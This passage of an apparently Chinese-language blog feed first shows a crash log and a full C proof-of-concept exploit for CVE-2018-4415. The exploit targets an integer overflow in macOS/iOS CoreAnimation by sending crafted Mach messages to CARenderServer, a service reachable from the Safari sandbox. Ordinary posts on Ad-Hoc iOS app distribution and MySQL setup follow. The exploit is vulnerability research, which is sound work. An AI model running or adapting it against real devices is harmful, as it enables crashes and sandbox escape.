0x000000018ff0c26c 0x18ff01000 + 45676</span><br><span class="line">9 libsystem_pthread.dylib 0x000000018ff0c1b0 0x18ff01000 + 45488</span><br><span class="line">10 libsystem_pthread.dylib 0x000000018ff0fd20 0x18ff01000 + 60704</span><br><span class="line"></span><br><span class="line">Thread 13 name: Dispatch queue: com.apple.libdispatch−manager</span><br><span class="line">Thread 13 Crashed:</span><br><span class="line">0 libdispatch.dylib 0x000000018fd18514 0x18fcca000 + 320788</span><br><span class="line">1 libdispatch.dylib 0x000000018fd1606c 0x18fcca000 + 311404</span><br><span class="line">2 libdispatch.dylib 0x000000018fd1606c 0x18fcca000 + 311404</span><br><span class="line">3 libdispatch.dylib 0x000000018fd0f1ac 0x18fcca000 + 283052</span><br><span class="line">4 libsystem_pthread.dylib 0x000000018ff0d078 0x18ff01000 + 49272</span><br><span class="line">5 libsystem_pthread.dylib 0x000000018ff0fd18 0x18ff01000 + 60696</span><br></pre></td></tr></table></figure>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Brief: Integer overflow in CoreAnimation, CVE-2018-4415</span></span><br><span class="line"><span class="comment"> *  Usage:</span></span><br><span class="line"><span class="comment"> *    1. clang FunctionIntOverFlow.c -o function_over_flow</span></span><br><span class="line"><span class="comment"> *    2. ./function_over_flow</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  Specifically, `CA::Render::InterpolatedFunction::allocate_storage` function in QuartzCore does</span></span><br><span class="line"><span class="comment"> *  not do any check for integer overflow in expression |result = (char *)malloc(4 * (v4 + v3));|.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  The bug has been fixed in macOS 10.14.1 and iOS 12.1, since the interfaces and structure of</span></span><br><span class="line"><span class="comment"> *  messages are inconsistent between different versions, this PoC may only work on macOS 10.14 and</span></span><br><span class="line"><span class="comment"> *  iOS 12.0, but it's very easy to replant it to another versions.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  Tips for debugging on macOS: Turn Mac to sleep mode and ssh to the target machine, this may</span></span><br><span class="line"><span class="comment"> *  help you concentrate on your work.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  One more: Mach service com.apple.CARenderServer is reacheable from Safari sandbox on both macOS</span></span><br><span class="line"><span class="comment"> *  and iOS. com.apple.windowserver.active accurately on macOS versions prior to macOS 10.14.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/mach.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_int_overflow</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">mach_port_t</span> p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;</span><br><span class="line">    task_get_bootstrap_port(mach_task_self(), &amp;bs_port);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *render_service_name = <span class="string">"com.apple.CARenderServer"</span>;</span><br><span class="line">    <span class="keyword">kern_return_t</span> (*bootstrap_look_up)(<span class="keyword">mach_port_t</span>, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">mach_port_t</span> *) =</span><br><span class="line">        dlsym(RTLD_DEFAULT, <span class="string">"bootstrap_look_up"</span>);</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] Cannot get service of %s, %s!\n"</span>, render_service_name, mach_error_string(kr));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">quartz_register_client_s</span> <span class="title">quartz_register_client_t</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">quartz_register_client_s</span> &#123;</span></span><br><span class="line">        <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">        <span class="keyword">uint32_t</span> body;</span><br><span class="line">        <span class="keyword">mach_msg_port_descriptor_t</span> ports[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">char</span> padding[<span class="number">12</span>];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">quartz_register_client_t</span> msg_register;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg_register, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg_register));</span><br><span class="line">    msg_register.header.msgh_bits =</span><br><span class="line">        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |</span><br><span class="line">        MACH_MSGH_BITS_COMPLEX;</span><br><span class="line">    msg_register.header.msgh_remote_port = p;</span><br><span class="line">    msg_register.header.msgh_local_port = mig_get_reply_port();</span><br><span class="line">    msg_register.header.msgh_id = <span class="number">40202</span>;  <span class="comment">// _XRegisterClient</span></span><br><span class="line"></span><br><span class="line">    msg_register.body = <span class="number">4</span>;</span><br><span class="line">    msg_register.ports[<span class="number">0</span>].name = mach_task_self();</span><br><span class="line">    msg_register.ports[<span class="number">0</span>].disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">    msg_register.ports[<span class="number">0</span>].type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line">    msg_register.ports[<span class="number">1</span>].name = mach_task_self();</span><br><span class="line">    msg_register.ports[<span class="number">1</span>].disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">    msg_register.ports[<span class="number">1</span>].type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line">    msg_register.ports[<span class="number">2</span>].name = mach_task_self();</span><br><span class="line">    msg_register.ports[<span class="number">2</span>].disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">    msg_register.ports[<span class="number">2</span>].type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line">    msg_register.ports[<span class="number">3</span>].name = mach_task_self();</span><br><span class="line">    msg_register.ports[<span class="number">3</span>].disposition = MACH_MSG_TYPE_COPY_SEND;</span><br><span class="line">    msg_register.ports[<span class="number">3</span>].type = MACH_MSG_PORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line">    kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,</span><br><span class="line">                  <span class="keyword">sizeof</span>(<span class="keyword">quartz_register_client_t</span>), <span class="keyword">sizeof</span>(<span class="keyword">quartz_register_client_t</span>),</span><br><span class="line">                  msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line">    <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] Send message failed: %s\n"</span>, mach_error_string(kr));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">mach_port_t</span> context_port = *(<span class="keyword">uint32_t</span> *)((<span class="keyword">uint8_t</span> *)&amp;msg_register + <span class="number">0x1c</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> conn_id = *(<span class="keyword">uint32_t</span> *)((<span class="keyword">uint8_t</span> *)&amp;msg_register + <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">quartz_function_int_overflow_s</span> <span class="title">quartz_function_int_overflow_t</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">quartz_function_int_overflow_s</span> &#123;</span></span><br><span class="line">        <span class="keyword">mach_msg_header_t</span> header;</span><br><span class="line">        <span class="keyword">char</span> msg_body[<span class="number">0x60</span>];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">quartz_function_int_overflow_t</span> function_int_overflow_msg = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    function_int_overflow_msg.header.msgh_bits =</span><br><span class="line">        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, <span class="number">0</span>) | MACH_MSGH_BITS_COMPLEX;</span><br><span class="line">    function_int_overflow_msg.header.msgh_remote_port = context_port;</span><br><span class="line">    function_int_overflow_msg.header.msgh_id = <span class="number">40002</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(function_int_overflow_msg.msg_body, <span class="number">0x0</span>, <span class="keyword">sizeof</span>(function_int_overflow_msg.msg_body));</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">0</span>) = <span class="number">0x1</span>;  <span class="comment">// Ports count</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *	1. One port consumes 12B space</span></span><br><span class="line"><span class="comment">     *	2. This `mach_msg` routine dose not need a port, so set this port to MACH_PORT_NULL(memory</span></span><br><span class="line"><span class="comment">     *	   cleared by memset)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">0</span>) = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">4</span>) = conn_id;</span><br><span class="line">    *(<span class="keyword">int8_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span>) = <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">1</span>) = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">9</span>) = <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint8_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">13</span>) = <span class="number">0x12</span>;  <span class="comment">// Decode Function</span></span><br><span class="line">    *(<span class="keyword">uint8_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">14</span>) = <span class="number">0x2</span>;</span><br><span class="line">    <span class="comment">/**(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 15) = 0xDECAFBAD;*/</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">15</span>) = <span class="number">0x2000000000000000</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">23</span>) = <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">27</span>) = <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">uint8_t</span> *)(function_int_overflow_msg.msg_body + <span class="number">4</span> + <span class="number">12</span> + <span class="number">16</span> + <span class="number">31</span>) = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    kr = mach_msg(&amp;function_int_overflow_msg.header, MACH_SEND_MSG,</span><br><span class="line">                  <span class="keyword">sizeof</span>(function_int_overflow_msg), <span class="number">0</span>, <span class="number">0</span>, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line">    <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] Send message failed: %s\n"</span>, mach_error_string(kr));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    do_int_overflow();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
            <category> 沙箱逃逸 </category>
            
            <category> 堆溢出 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS </tag>
            
            <tag> MacOS </tag>
            
            <tag> Safari </tag>
            
            <tag> 堆溢出 </tag>
            
            <tag> 沙箱逃逸 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[以Ad-Hoc方式发布iOS应用]]></title>
      <url>/blog/public/2018/11/28/%E4%BB%A5Ad-Hoc%E6%96%B9%E5%BC%8F%E5%8F%91%E5%B8%83iOS%E5%BA%94%E7%94%A8</url>
      <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>项目开发的App因为某些原因无法在AppStore上架，为了便于后续使用还是需要一种能够不经AppStore安装iOS App的手段。参照<a href="https://help.apple.com/deployment/ios/#/apdda9e027d2" target="_blank" rel="noopener">iOS部署参考</a>，得知可以以Ad Hoc的方式发布iOS App。</p>
<h2 id="0x00-准备"><a href="#0x00-准备" class="headerlink" title="0x00 准备"></a>0x00 准备</h2><p>· 一个支持https的网站，用来存放你的app以及相关文件<br>· 一个等待发布的iOS项目</p>
<h2 id="0x01-Apache服务器配置HTTPS"><a href="#0x01-Apache服务器配置HTTPS" class="headerlink" title="0x01 Apache服务器配置HTTPS"></a>0x01 Apache服务器配置HTTPS</h2><p>我的服务器是搭建在阿里云上的，域名也是通过阿里云注册的。在阿里云的域名控制台的域名列表中选择要配置HTTPS的域名，进入其管理页面，点击免费开启SSL证书，根绝自己的需求选择开通证书的种类，经过验证后就可以等待审核了。审核通过后可以通过证书控制台按照服务器种类下载相应的证书。Apache服务器对应的证书文件下载下来有三个，<code>xxxx_chain.crt</code>、<code>xxxx_public.crt</code>、<code>xxxx.key</code>。</p>
<p>假设我们的服务器已经安装好了Apache，我们把下载到的证书文件全都拷贝到服务器上，创建一个目录来存放他们，我这里存放在<code>/etc/httpd/conf/sss/</code>目录下，这个目录开始不存在，是我自己创建的。</p>
<p>然后修改<code>/etc/httpd/conf.d/ssl.conf</code>文件：</p>
<ol>
<li><p>取消下面两行配置的注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentRoot &quot;/var/www/html&quot;</span><br><span class="line">ServerName www.example.com:443</span><br></pre></td></tr></table></figure>
</li>
<li><p>根据我们获得的证书文件修改下面配置条目</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SSLCertificateFile /path/to/xxxx_public.crt</span><br><span class="line">SSLCertificateKeyFile /path/to/xxxx.key</span><br><span class="line">SSLCertificateChainFile /path/to/xxxx_chain.crt</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启httpd服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service httpd restart</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>顺利的话使用https协议头访问域名应该没问题了。</p>
<h2 id="0x02-应用发布"><a href="#0x02-应用发布" class="headerlink" title="0x02 应用发布"></a>0x02 应用发布</h2><ol>
<li>使用Xcode打开待发布的项目，选择 Product -&gt; Archive便开始归档。</li>
<li>归档后可以通过Window -&gt; Organizer查看已经归档的项目。</li>
<li>选中待发布的项目，点击Distribute按钮进入发布流程。</li>
<li>发布完成后将对应的<code>ipa</code>文件和<code>manifest.plist</code>文件放入之前配置的服务器的Web目录下。</li>
<li><p>创建<code>download.html</code>文件，写入内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;itms-services://?action=download-manifest&amp;url=https://your.domainName/manifest.plist&quot;&gt;Install App&lt;/a&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>这样点击Install App便可以完成iOS App在手机上的安装了。</p>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> iOS </tag>
            
            <tag> 开发 </tag>
            
            <tag> 配置 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CentOS 7.5 安装Mysql]]></title>
      <url>/blog/public/2018/11/26/CentOS-7-5-%E5%AE%89%E8%A3%85Mysql</url>
      <content type="html"><![CDATA[<blockquote>
<p>引自：<a href="https://www.linode.com/docs/databases/mysql/how-to-install-mysql-on-centos-7/" target="_blank" rel="noopener">https://www.linode.com/docs/databases/mysql/how-to-install-mysql-on-centos-7/</a></p>
</blockquote>
<h1 id="0x00-准备"><a href="#0x00-准备" class="headerlink" title="0x00 准备"></a>0x00 准备</h1><p>· 安装wget</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y wget</span><br></pre></td></tr></table></figure>
<h1 id="0x01-安装MySQL"><a href="#0x01-安装MySQL" class="headerlink" title="0x01 安装MySQL"></a>0x01 安装MySQL</h1><p>· 下载Repo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm</span><br><span class="line">sudo rpm -ivh mysql-community-release-el7-5.noarch.rpm</span><br><span class="line">sudo yum update</span><br></pre></td></tr></table></figure>
<p>· 安装MySQL，并启动MySQL服务。在安装过程中，yum会询问是否接受rpm的GPG认证，确认无误请输入y表示接受。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install mysql-server</span><br><span class="line">sudo systemctl start mysqld</span><br></pre></td></tr></table></figure>
<h1 id="0x02-加固MySQL服务器"><a href="#0x02-加固MySQL服务器" class="headerlink" title="0x02 加固MySQL服务器"></a>0x02 加固MySQL服务器</h1><p>运行命令进入安全配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql_secure_installation</span><br></pre></td></tr></table></figure>
<p>依次出现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Enter current password for root (enter for none):</span><br><span class="line">如果之前没有设置过密码的话这里是空</span><br><span class="line"></span><br><span class="line">Set root password? [Y/n] Y</span><br><span class="line">接下来被询问是否设置root密码，选择&apos;Y&apos;并输入你的root密码。</span><br><span class="line"></span><br><span class="line">Remove anonymous users? [Y/n]</span><br><span class="line">询问是否移除匿名用户（MySQL默认的没有用户名密码就可以登录的用户），根据自己的需求选择，我选择了Y。</span><br><span class="line"></span><br><span class="line">Disallow root login remotely? [Y/n]</span><br><span class="line">是否禁止root用户远程登录，我选择了Y。</span><br><span class="line"></span><br><span class="line">Remove test database and access to it? [Y/n]</span><br><span class="line">是否移除测试数据库，我选择了Y。</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? [Y/n]</span><br><span class="line">是否重新载入权限表。意味着应用刚才所做的一系列配置，我选择了Y。</span><br></pre></td></tr></table></figure>
<h1 id="0x03-创建数据库以及相应的MySQL用户"><a href="#0x03-创建数据库以及相应的MySQL用户" class="headerlink" title="0x03 创建数据库以及相应的MySQL用户"></a>0x03 创建数据库以及相应的MySQL用户</h1><p>· 创建数据库（这里用’demo’表示新建数据库）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database demo;</span><br></pre></td></tr></table></figure>
<p>· 创建用户并赋予demo数据库的所有权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create user &apos;usrname&apos;@&apos;localhost&apos; identified by &apos;pwd&apos;;</span><br><span class="line">grant all on demo.* to &apos;usrname&apos; identified by &apos;pwd&apos;;</span><br></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> CentOS </tag>
            
            <tag> 环境配置 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MMDB build failed.]]></title>
      <url>/blog/public/2018/08/05/MMDB-build-failed</url>
      <content type="html"><![CDATA[<h1 id="MMDB-build-failed"><a href="#MMDB-build-failed" class="headerlink" title="MMDB build failed."></a>MMDB build failed.</h1><p>实践苹果NetworkExtension过程中遇到的问题，需要向项目中导入<a href="https://github.com/zhuhaow/NEKit" target="_blank" rel="noopener">NEKit</a>，遵循NEKit给出的指导，用的是<code>Carthage</code>，但是执行<code>carthage update --no-use-binaries --platform mac,ios</code>过程中屡次失败，经查出错前最后的部分log如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span 